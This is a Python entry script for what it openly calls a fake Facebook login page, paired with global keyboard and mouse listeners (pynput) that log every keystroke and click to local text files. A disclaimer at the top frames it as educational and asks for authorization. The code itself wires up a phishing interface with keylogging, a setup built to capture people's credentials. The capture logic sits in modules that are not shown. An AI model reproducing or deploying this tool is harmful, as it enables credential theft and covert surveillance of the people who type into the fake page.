# DISCLAIMER: 
# This project is intended for educational and experimental purposes only. 
# Monitoring keyboard and mouse input can have legal and ethical implications. 
# Always ensure you have proper authorization and follow applicable laws and platform policies.
#
# After getting the proper authorization: Operating systems require explicit user permission 
# for the application or terminal running it, so you must allow monitoring keyboard input
# from the system settings. See README for more instructions on how to achieve this (REQUIRED PERMISSIONS).
#
# If permissions are not granted, the program may fail silently or not capture any input.


# ==================== BUILT-IN MODULES ====================
from pynput import keyboard, mouse

# ==================== CUSTOM MODULES ====================
from filemanager import FileManager
from logger import InteractionLogger
from ui import create_ui
from input_handlers import InputHandlers


# ==================== FILE/LOGGER SETUP ====================
file_manager = FileManager("logs.txt")
organized_file = FileManager("organized_keys.txt")
logger = InteractionLogger(file_manager)

organized_file.save([])   # Clear previous organized output


# ==================== PROPER SHUTDOWN ====================
def end_program():
    try:
        logger.save_all()           # Save logs
        handlers.flush_sentence()   # Save organized_keys
    except Exception:
        pass                        # Prevents shutdown from failing due to a logging error

    # Stop listeners
    keyboard_listener.stop()
    mouse_listener.stop()
    root.destroy()                  # Destroy tkinter root window


# ==================== UI ====================
root, status_label = create_ui(end_program)     # Create fake Facebook log in page


# ==================== INPUT HANDLERS SETUP ====================
# Input handlers
handlers = InputHandlers(logger=logger, organized_file=organized_file, status_label=status_label)

# Input listeners
keyboard_listener = keyboard.Listener(on_press=handlers.on_key_press)
mouse_listener = mouse.Listener(on_click=handlers.on_click)

keyboard_listener.start()
mouse_listener.start()


# ==================== MAIN LOOP ====================
root.mainloop()